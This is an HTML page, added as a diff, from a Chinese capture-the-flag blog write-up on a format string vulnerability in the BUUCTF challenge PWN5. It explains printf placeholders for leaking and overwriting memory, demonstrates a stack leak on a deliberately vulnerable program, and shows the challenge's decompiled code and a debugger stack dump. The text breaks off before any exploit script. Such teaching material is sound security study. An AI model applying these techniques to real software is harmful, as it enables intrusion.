@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">PWN&gt; [第五空间2019 决赛]PWN5 [BUUCTF] | a39&#39;s blog</title>
+<meta property="og:title" content="PWN&gt; [第五空间2019 决赛]PWN5 [BUUCTF] | a39&#39;s blog" />
+<meta name="twitter:title" content="PWN&gt; [第五空间2019 决赛]PWN5 [BUUCTF] | a39&#39;s blog" />
+<meta itemprop="name" content="PWN&gt; [第五空间2019 决赛]PWN5 [BUUCTF] | a39&#39;s blog" />
+<meta name="application-name" content="PWN&gt; [第五空间2019 决赛]PWN5 [BUUCTF] | a39&#39;s blog" />
+<meta property="og:site_name" content="Awesome hugo blog" />
+
+<meta name="description" content="PWN 第五空间2019决赛 PWN5 BUUCTF">
+<meta itemprop="description" content="PWN 第五空间2019决赛 PWN5 BUUCTF" />
+<meta property="og:description" content="PWN 第五空间2019决赛 PWN5 BUUCTF" />
+<meta name="twitter:description" content="PWN 第五空间2019决赛 PWN5 BUUCTF" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/posts/pwn5/" title="English" />
+
+
+
+  <meta itemprop="image" content="http://localhost:1313/" />
+  <meta property="og:image" content="http://localhost:1313/" />
+  <meta name="twitter:image" content="http://localhost:1313/" />
+  <meta name="twitter:image:src" content="http://localhost:1313/" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2022-10-19T00:00:00Z />
+    <meta property="article:published_time" content=2022-10-19T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="A39" />
+    <meta property="article:author" content="A39" />
+    <meta name="author" content="A39" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "PWN\u003e [第五空间2019 决赛]PWN5 [BUUCTF]",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2022-10-19",
+        "description": "PWN 第五空间2019决赛 PWN5 BUUCTF",
+        "wordCount":  555 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2022-10-19",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "a39\u0027s blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.124.1">
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/posts/pwn5/">
+    <link href="/style.min.4f425fac94f4dc104bcea9917ddb61e42c44aacaff8ba84ffc9040717f5b9d72.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/favicon.ico">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon.ico">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon.ico">
+    <link rel="mask-icon" href="/icons/favicon.ico">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/friends/">
+                        Friends
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">PWN&gt; [第五空间2019 决赛]PWN5 [BUUCTF]</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2022-10-19T00:00:00&#43;00:00" itemprop="datePublished"> 19 Oct 2022 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#格式化字符串漏洞">格式化字符串漏洞</a>
+      <ul>
+        <li><a href="#格式化字符串和格式化字符串函数">格式化字符串和格式化字符串函数</a></li>
+        <li><a href="#格式化字符串漏洞原理">格式化字符串漏洞原理</a>
+          <ul>
+            <li><a href="#基本原理">基本原理</a></li>
+            <li><a href="#漏洞利用">漏洞利用</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#题目">题目</a>
+      <ul>
+        <li><a href="#解题过程">解题过程</a></li>
+        <li><a href="#exp">EXP</a></li>
+      </ul>
+    </li>
+    <li><a href="#杂谈">杂谈</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="格式化字符串漏洞">格式化字符串漏洞</h2>
+<p>先来简单讲讲什么是格式化字符串漏洞</p>
+<h3 id="格式化字符串和格式化字符串函数">格式化字符串和格式化字符串函数</h3>
+<p>格式化字符串（Format String）是一些程序设计语言的输入/输出库中能将字符串参数转换为另一种形式输出的函数。</p>
+<p>格式化字符串函数则是一种可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数的函数。</p>
+<p>举个例子，C语言中的<code>printf</code>函数就是一种典型的格式化字符串函数，而标准<code>printf</code>函数写法中第一个参数（图中标红部分）就是格式化字符串</p>
+<p><img alt="img" src="./img/202210printf.png"></p>
+<p>在C和C++中常见的格式化字符串函数有</p>
+<ul>
+<li>输入
+<ul>
+<li><code>scanf</code>：从stdin中读取</li>
+</ul>
+</li>
+<li>输出
+<ul>
+<li><code>printf</code>：输出到stdout</li>
+<li><code>fprintf</code>：输出到指定的FILE流</li>
+<li><code>vprintf</code>：根据参数列表格式化输出到stdout</li>
+<li><code>vfprintf</code>：根据参数列表格式化输出到指定 FILE 流</li>
+<li><code>sprintf</code>：输出到字符串</li>
+<li><code>snprintf</code>：输出指定字节数到字符串</li>
+<li><code>vsprintf</code>：根据参数列表格式化输出到字符串</li>
+<li><code>vsnprintf</code>：根据参数列表格式化输出指定字节到字符串</li>
+<li><code>setproctitle</code>：设置 argv</li>
+<li><code>syslog</code>：输出日志</li>
+<li><code>err，verr，warn，vwarn</code>等等</li>
+</ul>
+</li>
+</ul>
+<p>C和C++格式化字符串中格式化占位符（format placeholder）的语法如下：</p>
+<pre tabindex="0"><code>%[parameter][flags][field width][.precision][length]type
+</code></pre><p>这里贴出维基百科里格式化字符串各占位符的详解</p>
+<p><img alt="img" src="./img/202210wiki.png"></p>
+<h3 id="格式化字符串漏洞原理">格式化字符串漏洞原理</h3>
+<h4 id="基本原理">基本原理</h4>
+<p>依旧以<code>printf</code>函数为例</p>
+<p><img alt="img" src="./img/202210printf.png"></p>
+<p>进入<code>printf</code>函数之前程序的栈如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">esp</span> <span class="mh">0xffffce1c</span> <span class="err">—▸</span> <span class="mh">0x80491b9</span> <span class="p">(</span><span class="n">main</span><span class="o">+</span><span class="mi">67</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span> <span class="mh">0x20</span>
+</span></span><span class="line"><span class="cl"><span class="mo">01</span><span class="o">:</span><span class="mo">0004</span><span class="err">│</span>         <span class="mh">0xffffce20</span> <span class="err">—▸</span> <span class="mh">0x804a00c</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">Color</span> <span class="o">%</span><span class="n">s</span><span class="p">,</span> <span class="n">Number</span> <span class="o">%</span><span class="n">d</span><span class="p">,</span> <span class="n">Float</span> <span class="o">%</span><span class="mf">4.2f</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="mo">02</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span>         <span class="mh">0xffffce24</span> <span class="err">—▸</span> <span class="mh">0x804a008</span> <span class="err">◂—</span> <span class="mh">0x646572</span> <span class="cm">/* &#39;red&#39; */</span>
+</span></span><span class="line"><span class="cl"><span class="mo">03</span><span class="o">:</span><span class="mo">000</span><span class="n">c</span><span class="err">│</span>         <span class="mh">0xffffce28</span> <span class="err">◂—</span> <span class="mh">0x1e240</span>
+</span></span><span class="line"><span class="cl"><span class="mo">04</span><span class="o">:</span><span class="mo">0010</span><span class="err">│</span>         <span class="mh">0xffffce2c</span> <span class="err">◂—</span> <span class="mh">0x51eb851f</span>
+</span></span><span class="line"><span class="cl"><span class="mo">05</span><span class="o">:</span><span class="mo">0014</span><span class="err">│</span>         <span class="mh">0xffffce30</span> <span class="err">◂—</span> <span class="mh">0x40091eb8</span>
+</span></span><span class="line"><span class="cl"><span class="mo">06</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span>         <span class="mh">0xffffce34</span> <span class="err">—▸</span> <span class="mh">0xf7fbe66c</span> <span class="err">—▸</span> <span class="mh">0xf7ffdba0</span> <span class="err">—▸</span> <span class="mh">0xf7fbe780</span> <span class="err">—▸</span> <span class="mh">0xf7ffda40</span> <span class="err">◂—</span> <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="mo">07</span><span class="o">:</span><span class="mo">001</span><span class="n">c</span><span class="err">│</span>         <span class="mh">0xffffce38</span> <span class="err">—▸</span> <span class="mh">0xf7fbeb10</span> <span class="err">—▸</span> <span class="mh">0xf7d98cc6</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">GLIBC_PRIVATE</span><span class="err">&#39;</span>
+</span></span></code></pre></div><p>因为x86架构下程序栈从高地址向低地址生长，所以我们可以看到栈上由高地址到低地址的布局如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">some</span> <span class="n">value</span>
+</span></span><span class="line"><span class="cl"><span class="mf">3.14</span><span class="err">（</span><span class="mh">0x51eb851f</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl"><span class="mi">123456</span><span class="err">（</span><span class="mh">0x1e240</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="n">of</span> <span class="s">&#34;red&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="n">of</span> <span class="n">format</span> <span class="nl">string</span><span class="p">:</span> <span class="n">Color</span> <span class="o">%</span><span class="n">s</span><span class="p">,</span> <span class="n">Number</span> <span class="o">%</span><span class="n">d</span><span class="p">,</span> <span class="n">Float</span> <span class="o">%</span><span class="mf">4.2f</span>
+</span></span></code></pre></div><p>由于<code>printf</code>函数是一个可变参数函数，在关闭gcc保护的情况下我们可以编译只传入一个参数的<code>printf</code>函数，比如</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Color %s, Number %d, Float %4.2f&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>在这种情况下<code>printf</code>函数会照常运行，此时就会将栈上第一个参数（格式化字符串）上面的三个参数分别解析为地址对应的字符串、整型数值、浮点数值并输出</p>
+<h4 id="漏洞利用">漏洞利用</h4>
+<p>这个漏洞涉及对内存的各种操作，篇幅较长，故在这里只介绍跟本题有关的利用方式</p>
+<p>首先来介绍一下几个常用的格式化占位符</p>
+<ul>
+<li><code>%n$x</code>（n为某一数值，x为某个占位符）可以对栈上第n个参数进行相应占位符的操作</li>
+<li><code>%x</code>、<code>%p</code>可以用来获取对应栈的内存，后者可以不用考虑位数区别</li>
+<li><code>%s</code>可以用来获取对应栈的内容，注意有零截断</li>
+<li><code>%n</code>可以将对应栈上的指针指向的内存内容修改为在它之前输入的字符数量</li>
+</ul>
+<p>好了，现在来看一个简单的例子</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0x22222222</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%08x.%08x.%08x.%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>在Linux下用gcc将程序编译为32位ELF文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$  gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
+</span></span><span class="line"><span class="cl">leakmemory.c: In <span class="k">function</span> ‘main’:
+</span></span><span class="line"><span class="cl">leakmemory.c:8:12: warning: format not a string literal and no format arguments <span class="o">[</span>-Wformat-security<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="m">8</span> <span class="p">|</span>     printf<span class="o">(</span>s<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">       <span class="p">|</span>            ^
+</span></span></code></pre></div><p>简单运行一下</p>
+<pre tabindex="0"><code>$  ./leakmemory
+%08x.%08x.%08x
+00000001.22222222.ffffffff.%08x.%08x.%08x
+ffcfc400.000000c2.f765a6bb
+</code></pre><p>可以看到栈中的内存就被泄露出来了</p>
+<p>限于篇幅这里只做简单的演示，实际上这个漏洞有很大的利用空间，比如修改内存、修改GOT表、修改PLT表等等</p>
+<h2 id="题目">题目</h2>
+<h3 id="解题过程">解题过程</h3>
+<p>拿到一个ELF文件，先file一下看看</p>
+<pre tabindex="0"><code>pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a8aa744920dda62e84d44fcc440c05f31c4c23d, stripped
+</code></pre><p>是个32位文件，再来checksec检查一下有没有写保护</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/c/Users/asuka/Desktop/CTF/BUU/pwn/5spacepwn5/pwn&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span></code></pre></div><p>看来在编译的时候被写上了栈溢出保护</p>
+<p>拖到32位IDA反编译看看</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-84h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">nptr</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [esp+4h] [ebp-80h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span> <span class="c1">// [esp+14h] [ebp-70h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+78h] [ebp-Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="o">*</span><span class="n">v7</span><span class="p">;</span> <span class="c1">// [esp+7Ch] [ebp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">a1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="nf">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">time</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">srand</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/urandom&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dword_804C044</span><span class="p">,</span> <span class="mi">4u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;your name:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x63u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello,&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;your passwd:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">nptr</span><span class="p">,</span> <span class="mh">0xFu</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">nptr</span><span class="p">)</span> <span class="o">==</span> <span class="n">dword_804C044</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;ok!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;fail&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">!=</span> <span class="n">v6</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">sub_80493D0</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>程序的大致意思是用户输入名字和密码，如果密码和程序在系统文件中获取的随机数<code>dword_804C044</code>相等则打开shell</p>
+<p>既然随机数我们无法获取，那么我们干脆将随机数修改为我们指定的值不就好了</p>
+<p>观察程序，不难发现程序有个没按标准传参的<code>printf(buf)</code>，因此我们可以利用它来修改内存</p>
+<p>gdb在<code>printf</code>下断点调试看看程序栈的分布</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">stack</span> <span class="mi">24</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">esp</span> <span class="mh">0xffffcdcc</span> <span class="err">—▸</span> <span class="mh">0x80492b2</span> <span class="err">◂—</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span> <span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl"><span class="mo">01</span><span class="o">:</span><span class="mo">0004</span><span class="err">│</span>         <span class="mh">0xffffcdd0</span> <span class="err">—▸</span> <span class="mh">0x804a020</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">Hello</span><span class="p">,</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="mo">02</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span>         <span class="mh">0xffffcdd4</span> <span class="err">—▸</span> <span class="mh">0xffffcdf8</span> <span class="err">◂—</span> <span class="mh">0x41414141</span> <span class="p">(</span><span class="err">&#39;</span><span class="n">AAAA</span><span class="err">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mo">03</span><span class="o">:</span><span class="mo">000</span><span class="n">c</span><span class="err">│</span>         <span class="mh">0xffffcdd8</span> <span class="err">◂—</span> <span class="mh">0x63</span> <span class="cm">/* &#39;c&#39; */</span>
+</span></span><span class="line"><span class="cl"><span class="mo">04</span><span class="o">:</span><span class="mo">0010</span><span class="err">│</span>         <span class="mh">0xffffcddc</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mo">05</span><span class="o">:</span><span class="mo">0014</span><span class="err">│</span>         <span class="mh">0xffffcde0</span> <span class="err">—▸</span> <span class="mh">0xf7ffdba0</span> <span class="err">—▸</span> <span class="mh">0xf7fbe780</span> <span class="err">—▸</span> <span class="mh">0xf7ffda40</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mo">06</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span>         <span class="mh">0xffffcde4</span> <span class="err">◂—</span> <span class="mh">0x3</span>
+</span></span><span class="line"><span class="cl"><span class="mo">07</span><span class="o">:</span><span class="mo">001</span><span class="n">c</span><span class="err">│</span>         <span class="mh">0xffffcde8</span> <span class="err">—▸</span> <span class="mh">0xf7fbe7b0</span> <span class="err">—▸</span> <span class="mh">0x804837f</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">GLIBC_2</span><span class="mf">.0</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">08</span><span class="o">:</span><span class="mo">0020</span><span class="err">│</span>         <span class="mh">0xffffcdec</span> <span class="err">◂—</span> <span class="mh">0x1</span>
+</span></span><span class="line"><span class="cl"><span class="mi">09</span><span class="o">:</span><span class="mo">0024</span><span class="err">│</span>         <span class="mh">0xffffcdf0</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">a</span><span class="p">:</span><span class="mo">002</span><span class="mi">8</span><span class="err">│</span>         <span class="mh">0xffffcdf4</span> <span class="err">◂—</span> <span class="mh">0x1</span>
